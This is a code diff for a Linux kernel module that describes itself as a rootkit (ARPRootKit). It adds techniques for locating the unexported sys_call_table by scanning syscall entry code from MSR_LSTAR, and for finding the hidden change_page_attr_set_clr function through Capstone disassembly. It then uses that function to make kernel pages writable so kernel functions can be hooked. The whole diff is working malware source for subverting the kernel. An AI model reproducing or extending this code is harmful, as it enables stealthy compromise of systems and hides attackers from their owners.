@@ -48,6 +48,7 @@
  */
 #define PAGE_ROUND_DOWN(x) (((unsigned long)(x)) & (~(PAGE_SIZE-1)))
 #define PAGE_ROUND_UP(x) ((((unsigned long)(x)) + PAGE_SIZE-1) & (~(PAGE_SIZE-1)))
+#define CPA_ARRAY 2
 
 /*
  * Kernel shared definitions: labels, variables and functions.
@@ -64,19 +65,25 @@
  */
 //void *readfile(const char *file, size_t *len);
 int disassemble(void *code, size_t code_len);
-void *search_sct(void);
+void *disass_search_inst_addr(void *code, const char *inst, const char *fmt, size_t max, int position, void **location_addr);
+void *search_sct_fastcall(void **psct_addr);
+void *search_sct_slowpath(void **psct_addr);
 void *memmem(const void *haystack, size_t hs_len, const void *needle, size_t n_len);
 void hook_kernel_funcs(void);
+int set_memory_rw(unsigned long addr, int pages);
+int set_memory_ro(unsigned long addr, int pages);
+void *search_change_page_attr_set_clr(void *set_memory);
 
 /*
  * Global variables.
  */
 void (*f_kernel_test)(void) = NULL;
+int (*change_page_attr_set_clr)(unsigned long *addr, int numpages, pgprot_t mask_set, pgprot_t mask_clr, int force_split, int in_flag, struct page **pages);
 
 int init_module(void)
 {
 	size_t kernel_len, kernel_paglen, kernel_pages;
-	void *kernel_addr = NULL;
+	void *kernel_addr = NULL, *tmp = NULL;
 
     kernel_len = &kernel_end - &kernel_start;
     kernel_paglen = PAGE_ROUND_UP((unsigned long)&kernel_start + (kernel_len - 1)) - PAGE_ROUND_DOWN(&kernel_start);
@@ -95,19 +102,37 @@ int init_module(void)
     f_find_vpid = find_vpid;
     f_vscnprintf = vscnprintf;
 
+	f_sys_write = kallsyms_lookup_name("sys_write");
+
 	/*
 	 * Search sys_call_table[] address.
 	 */
-	sys_call_table = search_sct();
-	if (sys_call_table == NULL) {
+	tmp = search_sct_fastcall(&psct_fastcall);
+	if (tmp == NULL) {
 		return 0;
 	}
-    
+	if (search_sct_slowpath(&psct_slowpath) != tmp) {
+		return 0;
+	}
+	sys_call_table = tmp;
+
 	/*
      * Linux Kernel syscall symbols for our rootkit.
      */
     f_sys_write = sys_call_table[__NR_write]; // now we can print into stdout and stderr =)
 
+	pinfo("Hurra! sys_call_table = %p, location = %p\n", sys_call_table, psct_fastcall);
+
+	/*
+	 * Search not exported symbols.
+	 */
+	change_page_attr_set_clr = search_change_page_attr_set_clr(set_memory_x);
+	if (change_page_attr_set_clr != NULL) {
+		pinfo("Hurra! change_page_attr_set_clr() = %p\n", change_page_attr_set_clr);
+	} else {
+		perr("Sorry, can't find change_page_attr_set_clr().\n");
+		return 0;
+	}
 /*
 	pinfo("%p\n", __rdmsr(MSR_LSTAR));
 	char *p = __rdmsr(MSR_LSTAR);
@@ -140,8 +165,6 @@ int init_module(void)
 	*/
 //	return 0;
 
-	pinfo("Hurra! sys_call_table = %p\n", sys_call_table);
-
 	//printk("kernel_len = %d, kernel_paglen = %d, kernel_pages = %d, kernel_addr = %p, kernel_pagdown_addr = %p\n", kernel_len, kernel_paglen, kernel_pages, &kernel_start, PAGE_ROUND_DOWN(&kernel_start));
 
 	/*
@@ -155,22 +178,23 @@ int init_module(void)
 		 * Make our rootkit code executable.
 		 */
 		set_memory_x(PAGE_ROUND_DOWN(kernel_addr), kernel_pages);
-		pinfo("kernel_addr's pages are now executable.\n");
+		//pinfo("kernel_addr's pages are now executable.\n");
 
 		memcpy(kernel_addr, &kernel_start, kernel_len);
-		pinfo("kernel is now copied to kernel_addr.\n");
+		//pinfo("kernel is now copied to kernel_addr.\n");
 		
 		//disassemble(kernel_addr + ((unsigned long)&kernel_code_start - (unsigned long)&kernel_start), ((unsigned long)&kernel_end - (unsigned long)&kernel_code_start));
 
 		kernel_test();
-		pinfo("kernel_test execution from LKM successful.\n");
+
+		//pinfo("kernel_test execution from LKM successful.\n");
 
 		f_kernel_test = kernel_addr + ((unsigned long)&kernel_test - (unsigned long)&kernel_start);
-		pinfo("f_kernel_test at %p\n", f_kernel_test);
+		//pinfo("f_kernel_test at %p\n", f_kernel_test);
 		f_kernel_test();
 		pinfo("f_kernel_test execution from allocated code, successful.\n");
 
-		hook_kernel_funcs();
+		//hook_kernel_funcs();
 
 		//pinfo("ARPRootKit successfully installed!\n");
 
@@ -186,6 +210,93 @@ int init_module(void)
 
 void cleanup_module(void)
 {
+}
+
+void *disass_search_inst_addr(void *addr, const char *inst, const char *fmt, size_t max, int position, void **loc_addr) {
+    csh handle;
+    cs_insn *insn;
+	void *addr_found = NULL;
+    size_t count;
+    size_t j, i;
+	size_t code_len;
+	int pos_count = 0;
+
+	if (cs_open(CS_ARCH_X86, CS_MODE_64, &handle) != CS_ERR_OK) {
+        perr("cs_open() error\n");
+        return NULL;
+    }
+
+    cs_option(handle, CS_OPT_SYNTAX, CS_OPT_SYNTAX_ATT); // CS_OPT_SYNTAX_ATT represents AT&T syntax
+
+	for (code_len = 15; 1; code_len += 15) {
+	    count = cs_disasm(handle, addr, code_len, (unsigned long)addr, 0, &insn);
+	    pinfo("%d instructions disassembled.\n", count);
+	    if (count > 0) {
+	        for (j = 0; j < count; j++) {
+	            pinfo("0x%"PRIx64":\t%s\t\t%s\n", insn[j].address, insn[j].mnemonic, insn[j].op_str);
+	            for (i = 0; i < insn[j].size; i++) {
+        	        pinfo("%02x ", insn[j].bytes[i]);
+				}
+            	pinfo("\n");
+                if (strlen(insn[j].mnemonic) >= strlen(inst) && strncmp(insn[j].mnemonic, inst, strlen(inst)) == 0) {
+                    pos_count ++;
+                    if (pos_count == position) {
+						sscanf(insn[j].op_str, fmt, &addr_found);
+                        //int r = kstrtou64(insn[j].op_str, 16, (u64 *)&addr_found);
+                        //pinfo("r %d %p\n", r, addr_found);
+                        pinfo("%s found! addr = %p\n", inst, addr_found);
+						*loc_addr = (void *) insn[j].address + (insn[j].size - sizeof(int));
+                        cs_free(insn, count);
+                        cs_close(&handle);
+                        return addr_found;
+                    }
+                }
+        	}
+        	cs_free(insn, count);
+			if (pos_count == position) {
+				break;
+			}
+	    } else {
+    	    pinfo("ERROR: Failed to disassemble given code!\n");
+	        cs_close(&handle);
+	        return NULL;
+	    }
+		if (code_len >= max) {
+			break;
+		}
+	}
+
+    cs_close(&handle);
+
+    return NULL;
+}
+	
+void *search_change_page_attr_set_clr(void *set_memory) {
+	void *tmp;
+	void *addr = disass_search_inst_addr(set_memory, "call", "%lx", 0x100, 1, &tmp);
+	return addr;
+}
+
+static inline int change_page_attr_set(unsigned long *addr, int numpages,
+                       pgprot_t mask, int array)
+{
+    return change_page_attr_set_clr(addr, numpages, mask, __pgprot(0), 0,
+        (array ? CPA_ARRAY : 0), NULL);
+}
+
+static inline int change_page_attr_clear(unsigned long *addr, int numpages,
+                     pgprot_t mask, int array)
+{
+    return change_page_attr_set_clr(addr, numpages, __pgprot(0), mask, 0,
+        (array ? CPA_ARRAY : 0), NULL);
+}
+
+int set_memory_rw(unsigned long addr, int numpages) {
+	return change_page_attr_set(&addr, numpages, __pgprot(_PAGE_RW), 0);
+}
+
+int set_memory_ro(unsigned long addr, int numpages) {
+	return change_page_attr_clear(&addr, numpages, __pgprot(_PAGE_RW), 0);
 }
 
 void hook_kernel_funcs(void) {
@@ -235,7 +346,7 @@ void *memmem(const void *haystack, size_t hs_len, const void *needle, size_t n_l
     return NULL;
 }
 
-void *search_sct(void) {
+void *search_sct_fastcall(void **psct_addr) {
 	void *sct = (void *) __rdmsr(MSR_LSTAR);
 	// DO NOT call disassemble() in this function as sys_write is not yet imported!
 	// or import sys_write into f_sys_write before calling:
@@ -249,6 +360,7 @@ void *search_sct(void) {
 		sct = memmem(sct, 0x100, "\xff\x14\xc5", 3); // search: call *sys_call_table(, %rax, 8)
 		if (sct) {
 			sct += 3;
+			*psct_addr = sct;
 			sct = (void *) (0xffffffffffffffff - (0 - *(unsigned int *) sct) + 1);
 			return sct;
 		} else{
@@ -260,6 +372,25 @@ void *search_sct(void) {
 		//perr("Sorry! jmp address not found when searching sct.\n");
 	}
 
+	return NULL;
+}
+
+void *search_sct_slowpath(void **psct_addr) {
+	void *sct = (void *) __rdmsr(MSR_LSTAR);
+	sct = memmem(sct, 0x100, "\x48\xc7\xc7", 3); // search: mov $address, %rdi; jmp *%rdi
+	if (memcmp(sct + 3 + 4, "\xff\xe7", 2) == 0) { // found!
+		sct += 3;
+		sct = (void *) (0xffffffffffffffff - (0 - *(unsigned int *) sct) + 1) + (2 + 1 + 0x31);
+		sct = disass_search_inst_addr(sct, "jne", "%lx", 0x100, 1, psct_addr);
+		if (sct != NULL) {
+			sct = disass_search_inst_addr(sct, "call", "%lx", 0x100, 1, psct_addr);
+			if (sct != NULL) {
+				sct = disass_search_inst_addr(sct, "call", "*-%lx(", 0x100, 1, psct_addr);
+				sct = (void *)((long) sct * -1);
+				return sct;
+			}
+		}
+	}
 	return NULL;
 }
 
